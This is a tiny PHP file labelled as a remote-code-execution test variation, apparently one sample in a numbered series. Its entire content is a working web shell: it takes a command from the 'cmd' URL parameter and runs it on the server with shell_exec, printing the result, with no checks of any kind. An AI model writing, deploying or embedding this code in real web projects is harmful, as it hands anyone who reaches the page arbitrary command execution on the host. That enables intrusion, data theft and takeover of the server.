<?php
// RCE test variation #717
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>